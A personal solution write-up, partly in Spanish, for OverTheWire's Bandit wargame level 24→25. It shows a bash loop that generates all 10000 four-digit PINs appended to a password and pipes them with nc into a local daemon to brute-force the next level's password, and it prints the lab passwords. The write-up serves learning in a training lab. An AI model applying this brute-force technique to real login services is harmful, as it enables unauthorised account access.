Bandit Level 24 → Level 25
Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

 ssh -p 2220  bandit24@bandit.labs.overthewire.org 
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 bandit24@bandit:~$ mktemp -d
/tmp/tmp.SD7k7M4p8X

ARMO UN SCRIPT QUE LE AGREGE UNPIN CODE DE 4 DIGITOS A LA CLAVE
#!/bin/bash

for i in {0000..9999}; do 
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"	
done

EJECUTAMOS
bandit24@bandit:/tmp/tmp.SD7k7M4p8X$ ./script.sh >  dictionary.txt
bandit24@bandit:/tmp/tmp.SD7k7M4p8X$ cat dictionary.txt | wc -l
10000

bandit24@bandit:/tmp/tmp.SD7k7M4p8X$ cat dictionary.txt | nc localhost 30002| grep -v -E "Wrong|Please"
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG	# clave sig nivel 25

Exiting.




